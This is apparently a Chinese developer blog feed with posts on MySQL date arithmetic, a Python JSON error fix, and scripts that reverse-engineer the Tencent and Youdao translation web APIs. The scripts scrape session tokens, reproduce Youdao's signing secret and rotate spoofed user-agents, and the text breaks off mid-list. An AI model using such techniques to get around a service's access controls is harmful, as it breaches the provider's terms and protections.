title="技能清单"></a>技能清单</h1><p>（我一般主张将技能清单写入到工作经历里边去。不过很难完整，所以有这么一段也不错）</p><p>以下均为我熟练使用的技能</p><ul><li>Web开发：PHP/Hack/Node</li><li>Web框架：ThinkPHP/Yaf/Yii/Lavarel/LazyPHP</li><li>前端框架：Bootstrap/AngularJS/EmberJS/HTML5/Cocos2dJS/ionic</li><li>前端工具：Bower/Gulp/SaSS/LeSS/PhoneGap</li><li>数据库相关：MySQL/PgSQL/PDO/SQLite</li><li>版本管理、文档和自动化部署工具：Svn/Git/PHPDoc/Phing/Composer</li><li>单元测试：PHPUnit/SimpleTest/Qunit</li><li>云和开放平台：SAE/BAE/AWS/微博开放平台/微信应用开发</li></ul><hr><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>感谢您花时间阅读我的简历，期待能有机会和您共事。</p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 简历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql 日期加减操作</title>
      <link href="2020/04/01/2020-04-01-mysql_date_add_sub/"/>
      <url>2020/04/01/2020-04-01-mysql_date_add_sub/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-日期加减操作"><a href="#MySQL-日期加减操作" class="headerlink" title="MySQL 日期加减操作"></a>MySQL 日期加减操作</h1><h4 id="1-日期加减"><a href="#1-日期加减" class="headerlink" title="1.日期加减"></a>1.日期加减</h4><p>MySQL 为日期增加/减去一个时间间隔：date_add()、date_sub()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set @dt &#x3D; now();</span><br><span class="line"></span><br><span class="line">select date_add(@dt, interval 1 day);        -- add 1 day</span><br><span class="line">select date_add(@dt, interval 1 hour);       -- add 1 hour</span><br><span class="line">select date_add(@dt, interval 1 minute);     -- ...</span><br><span class="line">select date_add(@dt, interval 1 second);</span><br><span class="line">select date_add(@dt, interval 1 microsecond);</span><br><span class="line">select date_add(@dt, interval 1 week);</span><br><span class="line">select date_add(@dt, interval 1 month);</span><br><span class="line">select date_add(@dt, interval 1 quarter);</span><br><span class="line">select date_add(@dt, interval 1 year);</span><br><span class="line"></span><br><span class="line">select date_add(@dt, interval -1 day);       -- sub 1 day</span><br></pre></td></tr></table></figure><p>date_sub()用法一样。</p><h4 id="2-日期、时间相减函数"><a href="#2-日期、时间相减函数" class="headerlink" title="2.日期、时间相减函数"></a>2.日期、时间相减函数</h4><p>datediff(date1,date2)：两个日期相减 date1 - date2，返回天数。</p><p>timediff(time1,time2)：两个日期相减 time1 - time2，返回 time 差值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select datediff(&#39;2008-08-08&#39;, &#39;2008-08-01&#39;);  -- 7</span><br><span class="line">select datediff(&#39;2008-08-01&#39;, &#39;2008-08-08&#39;);  -- -7</span><br><span class="line">select timediff(&#39;2008-08-08 08:08:08&#39;, &#39;2008-08-08 00:00:00&#39;); -- 08:08:08</span><br><span class="line">select timediff(&#39;08:08:08&#39;, &#39;00:00:00&#39;);                       -- 08:08:08</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读取json文件报错json.decoder.JSONDecodeError</title>
      <link href="2020/04/01/2020-04-01-read_json_ERROR_jsondecoderJSONDecodeError/"/>
      <url>2020/04/01/2020-04-01-read_json_ERROR_jsondecoderJSONDecodeError/</url>
      
        <content type="html"><![CDATA[<h1 id="读取json文件报错-json-decoder-JSONDecodeError"><a href="#读取json文件报错-json-decoder-JSONDecodeError" class="headerlink" title="读取json文件报错:json.decoder.JSONDecodeError"></a>读取json文件报错:json.decoder.JSONDecodeError</h1><p>针对安全客API使用过程中，对<a href="https://api.anquanke.com/data/v1/posts?page=2&amp;size=10&amp;category=news&amp;category=news%E6%8F%90%E4%BE%9B%E7%9A%84json%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cjson.load()%E5%87%BA%E9%94%99%E3%80%82">https://api.anquanke.com/data/v1/posts?page=2&amp;size=10&amp;category=news&amp;category=news提供的json文件进行json.load()出错。</a></p><h3 id="Extra-data-line-1-column-4-char-3"><a href="#Extra-data-line-1-column-4-char-3" class="headerlink" title="Extra data: line 1 column 4 (char 3)"></a>Extra data: line 1 column 4 (char 3)</h3><p><strong>出错原因：</strong></p><p>读取json文件数据时，由于指定的json文件内包含多个json格式的数据，所以报错。</p><h3 id="Invalid-control-character-at-line-2-column-18-char-19"><a href="#Invalid-control-character-at-line-2-column-18-char-19" class="headerlink" title="Invalid control character at: line 2 column 18 (char 19)"></a>Invalid control character at: line 2 column 18 (char 19)</h3><p><strong>出错原因：</strong></p><p>json默认使用的是严谨格式，当跨语言传递数据时，就容易报出这个错误。</p><p><strong>解决方法：</strong></p><p>加上参数 strict</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.loads(json_data, strict&#x3D;False)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> json </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 利用Google、有道、腾讯制作翻译功能</title>
      <link href="2020/04/01/2020-04-01-python_translate_google_youdao_tecent/"/>
      <url>2020/04/01/2020-04-01-python_translate_google_youdao_tecent/</url>
      
        <content type="html"><![CDATA[<h1 id="python-翻译功能"><a href="#python-翻译功能" class="headerlink" title="python 翻译功能"></a>python 翻译功能</h1><p>课题推进过程中发现，安全资讯标题及正文很多需要英译汉，故编写翻译脚本插入爬虫，并修改对应的web界面。</p><h3 id="腾讯翻译"><a href="#腾讯翻译" class="headerlink" title="腾讯翻译"></a>腾讯翻译</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_filter(text):</span><br><span class="line">    if isinstance(text, list):</span><br><span class="line">        text &#x3D; &#39;&#39;.join(text)</span><br><span class="line">    text &#x3D; str(text)</span><br><span class="line">    text &#x3D; text.strip()</span><br><span class="line">    filter_list &#x3D; [</span><br><span class="line">        &#39;\r&#39;, &#39;\n&#39;, &#39;\t&#39;, &#39;\u3000&#39;, &#39;\xa0&#39;, &#39;\u2002&#39;,</span><br><span class="line">        &#39;&lt;br&gt;&#39;, &#39;&lt;br&#x2F;&gt;&#39;, &#39;    &#39;, &#39;&#39;, &#39;&amp;nbsp;&#39;, &#39;&gt;&gt;&#39;, &#39;&quot;&#39;,</span><br><span class="line">        &#39;展开全部&#39;, &#39; &#39;</span><br><span class="line">    ]</span><br><span class="line">    for fl in filter_list:</span><br><span class="line">        text &#x3D; text.replace(fl, &#39;&#39;)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">def get_qtv_qtk():</span><br><span class="line">    api_url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, &#39;</span><br><span class="line">                      &#39;like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36&#39;, &#125;</span><br><span class="line"></span><br><span class="line">    res &#x3D; requests.get(api_url, headers&#x3D;headers)</span><br><span class="line">    data &#x3D; res.text</span><br><span class="line">    fy_guid &#x3D; res.cookies.get(&#39;fy_guid&#39;)</span><br><span class="line">    reg &#x3D; re.compile(r&#39;var qtv &#x3D; &quot;(.*?)&quot;&#39;)</span><br><span class="line">    qtv &#x3D; reg.search(data).group(1)</span><br><span class="line">    reg &#x3D; re.compile(r&#39;var qtk &#x3D; &quot;(.*?)&quot;&#39;)</span><br><span class="line">    qtk &#x3D; reg.search(data).group(1)</span><br><span class="line"></span><br><span class="line">    return fy_guid, qtv, qtk</span><br><span class="line"></span><br><span class="line">def getHtml(url,headers,data):</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        html&#x3D; requests.post(url&#x3D;url,data&#x3D; data,headers&#x3D;headers)</span><br><span class="line">        #print(html.text)</span><br><span class="line">        datas &#x3D; html.json()[&#39;translate&#39;][&#39;records&#39;]</span><br><span class="line">        if html!&#x3D;None and datas !&#x3D; None :</span><br><span class="line">            # 以文本的形式打印结果</span><br><span class="line">            trans_result &#x3D; &#39;&#39;.join([data[&#39;targetText&#39;] for data in datas])</span><br><span class="line">        return trans_result</span><br><span class="line">    except Exception:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">class TencentTrans(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.api_url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;api&#x2F;translate&#39;</span><br><span class="line">        self.headers &#x3D; &#123;</span><br><span class="line">            &#39;Cookie&#39;: &#39;fy_guid&#x3D;605ead81-f210-47eb-bd80-ac6ae5e7a2d8; &#39;</span><br><span class="line">                      &#39;qtv&#x3D;ed286a053ae88763; &#39;</span><br><span class="line">                      &#39;qtk&#x3D;wfMmjh3k&#x2F;7Sr2xVNg&#x2F;LtITgPRlnvGWBzP9a4FN0dn9PE7L5jDYiYJnW03MJLRUGHEFNCRhTfrp&#x2F;V+wUj0dun1KkKNUUmS86A&#x2F;wGVf6ydzhwboelTOs0hfHuF0ndtSoX+N3486tUMlm62VU4i856mqw&#x3D;&#x3D;; &#39;,</span><br><span class="line">            &#39;Host&#39;: &#39;fanyi.qq.com&#39;,</span><br><span class="line">            &#39;Origin&#39;: &#39;https:&#x2F;&#x2F;fanyi.qq.com&#39;,</span><br><span class="line">            &#39;Referer&#39;: &#39;https:&#x2F;&#x2F;fanyi.qq.com&#x2F;&#39;,</span><br><span class="line">            &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.36 (KHTML, &#39;</span><br><span class="line">                          &#39;like Gecko) Chrome&#x2F;73.0.3683.86 Safari&#x2F;537.36&#39;, &#125;</span><br><span class="line"></span><br><span class="line">        self.fromlang &#x3D; &#39;auto&#39;</span><br><span class="line">        self.text&#x3D;&#39;国家主席习近平致信祝贺中日高级别人文交流磋商机制首次会议在东京召开。习近平强调，当前，中日关系持续改善向好。希望中日双方共同利用好这一机制，推动人文交流，促进民心相通，为构建和发展契合新时代要求的中日关系提供人文支撑。&#39;</span><br><span class="line">        self.tolang &#x3D; &#39;en&#39;  # 设置默认为英语</span><br><span class="line">        self.sessionUuid &#x3D; str(int(time.time() * 1000))</span><br><span class="line"></span><br><span class="line">        self.fy_guid, self.qtv, self.qtk &#x3D; get_qtv_qtk()</span><br><span class="line"></span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;605ead81-f210-47eb-bd80-ac6ae5e7a2d8&#39;, self.fy_guid)</span><br><span class="line"></span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;ed286a053ae88763&#39;, self.qtv)</span><br><span class="line">        self.headers[&#39;Cookie&#39;] &#x3D; self.headers[&#39;Cookie&#39;].replace(</span><br><span class="line">            &#39;wfMmjh3k&#x2F;7Sr2xVNg&#x2F;LtITgPRlnvGWBzP9a4FN0dn9PE7L5jDYiYJnW03MJLRUGHEFNCRhTfrp&#x2F;V+wUj0dun1KkKNUUmS86A&#x2F;wGVf6ydzhwboelTOs0hfHuF0ndtSoX+N3486tUMlm62VU4i856mqw&#x3D;&#x3D;&#39;,</span><br><span class="line">            self.qtk)</span><br><span class="line"></span><br><span class="line">    def get_trans_result(self,text):</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;source&#39;: self.fromlang,</span><br><span class="line">            &#39;target&#39;: self.tolang,</span><br><span class="line">            &#39;sourceText&#39;: text,</span><br><span class="line">            &#39;qtv&#39;: self.qtv,</span><br><span class="line">            &#39;qtk&#39;: self.qtk,</span><br><span class="line">            &#39;sessionUuid&#39;: self.sessionUuid, &#125;</span><br><span class="line"></span><br><span class="line">        trans_result &#x3D; getHtml(self.api_url,self.headers,data)</span><br><span class="line">        return trans_result</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Tencent &#x3D; TencentTrans()</span><br><span class="line">    text &#x3D; &#39;&#39;&#39;You are here: Home &#x2F; Deep Web Links &#x2F; Deep Web Links and Websites – 1000 Active Top dark web sites</span><br><span class="line">Deep Web Links and Websites – 1000 Active Top dark web sites</span><br><span class="line"></span><br><span class="line">June 25, 2018 by Admin 24 Comments</span><br><span class="line"></span><br><span class="line">Deep web links covers – Tor websites, Deep web site, Dark net websites, dark web sites list, dark web websites, onion websites, hidden websites, tor websites list, etc., We have given a bunch of deep web links below, but before accessing those links know what is deep web and safety tips to access the deep web.</span><br><span class="line"></span><br><span class="line">The deep web is the hidden part of the internet. The deep web links are not indexed by the popular search engines like Google, Yahoo and Bing, etc., The links that are hidden from the internet are known as a deep web or deep web links. The deep web links have a special extension “.Onion” and also known as “Onion links”.</span><br><span class="line"></span><br><span class="line">Only 5% of the web is available on the surface web, the remaining 95% is hidden on the surface web. There are many scam sites or fraudulent sites are available on the internet. So be careful before using any of those links. Use the Tor browser to surf the deep web. Keep your anonymity safe in the deep web. Use the Tor browser along with a premium VPN to maintain your anonymity.</span><br><span class="line"></span><br><span class="line">Contents show</span><br><span class="line">HOW TO ACCESS THE DEEP WEB</span><br><span class="line"></span><br><span class="line">Before accessing the deep web you should know what is deep web and how to access the deep web safely.</span><br><span class="line"></span><br><span class="line">As you know that you cannot access the deep web in normal search engines and browsers, you need a special browser known as TOR browser to access the deep web.</span><br><span class="line"></span><br><span class="line">Do you know that Dark net is not only the place where you can purchase drugs, weapons or money counterfeits but also the place you can earn money? If you want to know more, take a look at this little Mr.Green’s Guide</span><br><span class="line">Why do we recommend you to use the TOR browser?</span><br><span class="line"></span><br><span class="line">It is because that Tor browser is specially made to access the .onion links. The main reason is that it maintains your anonymity. When you use TOR browser it hides your IP. Let me explain how the Tor works. If a user sends data the data is encrypted first. Then the encrypted data is sent to different layers of computers and it reaches the destination. This is structured like an onion. This is done because no one can find the user and trace them back. This process makes the user stay anonymous on the internet.</span><br><span class="line"></span><br><span class="line">Some tips to stay anonymous on the internet.</span><br><span class="line"></span><br><span class="line">        Always use the Tor web browser to browse the .onion links.</span><br><span class="line"></span><br><span class="line">        Never trust anyone on the deep web</span><br><span class="line"></span><br><span class="line">    Always use TOR along with a paid VPN because it ensures more anonymous.</span><br><span class="line">    Use different identity change your name and always use that name in deep web &#39;&#39;&#39;</span><br><span class="line">    print(Tencent.get_trans_result(text))</span><br></pre></td></tr></table></figure><h3 id="有道翻译"><a href="#有道翻译" class="headerlink" title="有道翻译"></a>有道翻译</h3><p>破解过程参考<a href="https://blog.csdn.net/qq_38534107/article/details/90411167">https://blog.csdn.net/qq_38534107/article/details/90411167</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">from html import unescape</span><br><span class="line">import hashlib</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_md( value):</span><br><span class="line"></span><br><span class="line">    #加密生成sign</span><br><span class="line">    m &#x3D; hashlib.md5()</span><br><span class="line">    # m.update(value)</span><br><span class="line">    m.update(value.encode(&#39;utf-8&#39;))</span><br><span class="line">    return m.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def charactor_es(sentence):</span><br><span class="line">    sentence &#x3D; unescape(sentence.replace(&#39;\n&#39;, &#39;&#39;))</span><br><span class="line">    sentence &#x3D; sentence.encode(&#39;utf-8&#39;)</span><br><span class="line">    sentence &#x3D; str(sentence).replace(r&#39;\xe2\x80\x94&#39;, &#39;-&#39;).replace(r&#39;\xef\xbc\x9a&#39;, &#39;:&#39;).replace(r&#39;\xe2\x80\x9c&#39;,&#39;&quot;&#39;).replace(r&#39;\xe2\x80\x9d&#39;, &#39;&quot;&#39;).replace(r&#39;\xef\xbc\x8c&#39;, &#39;,&#39;).replace(r&#39;\xe2\x80\x99&#39;, &#39;?&#39;).replace(r&#39;\xef\xbc\x9f&#39;,&#39;.&#39;).replace(r&#39;\xe2\x80\x93&#39;, &#39;-&#39;).replace(r&#39;\xc2\xa0&#39;, &#39;&#39;).replace(&#39;? &#39;, &#39; ?&#39;)</span><br><span class="line">    sentence &#x3D; sentence.lstrip(&#39;b&#39;)</span><br><span class="line">    sentence &#x3D; sentence.strip(&quot;&#39;&quot;).strip(&#39;&quot;&#39;)</span><br><span class="line"></span><br><span class="line">    return sentence</span><br><span class="line"></span><br><span class="line">def senten_trans(words):</span><br><span class="line">    words &#x3D; charactor_es(words)</span><br><span class="line"></span><br><span class="line">    # 对POST参数中的salt\sign进行生成</span><br><span class="line">    salt &#x3D; str(int(time.time() * 1000) + random.randint(0, 10))</span><br><span class="line">    s &#x3D; &quot;fanyideskweb&quot; + words + salt + &quot;ebSeFb%&#x3D;XZ%T[KZ)c(sy!&quot;</span><br><span class="line">    sign &#x3D; get_md(s)</span><br><span class="line"></span><br><span class="line">    AGENTSLIST &#x3D; [</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident&#x2F;4.0; WOW64; Trident&#x2F;4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit&#x2F;523.15 (KHTML, like Gecko, Safari&#x2F;419.3) Arora&#x2F;0.3 (Change: 287 c9dfb30)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (X11; U; Linux; en-US) AppleWebKit&#x2F;527+ (KHTML, like Gecko, Safari&#x2F;419.3) Arora&#x2F;0.6&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko&#x2F;20070215 K-Ninja&#x2F;2.1.1&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko&#x2F;20080705 Firefox&#x2F;3.0 Kapiko&#x2F;3.0&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (X11; Linux i686; U;) Gecko&#x2F;20070322 Kazehakase&#x2F;0.4.5&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora&#x2F;1.9.0.8-1.fc10 Kazehakase&#x2F;0.5.6&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.11 (KHTML, like Gecko) Chrome&#x2F;17.0.963.56 Safari&#x2F;535.11&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit&#x2F;535.20 (KHTML, like Gecko) Chrome&#x2F;19.0.1036.7 Safari&#x2F;535.20&quot;,</span><br><span class="line">            &quot;Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;536.11 (KHTML, like Gecko) Chrome&#x2F;20.0.1132.11 TaoBrowser&#x2F;2.0 Safari&#x2F;536.11&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;537.1 (KHTML, like Gecko) Chrome&#x2F;21.0.1180.71 Safari&#x2F;537.1 LBBROWSER&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64) AppleWebKit&#x2F;535.11 (KHTML, like Gecko) Chrome&#x2F;17.0.963.84 Safari&#x2F;535.11 LBBROWSER&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,</span><br><span class="line">            &quot;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident&#x2F;5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; 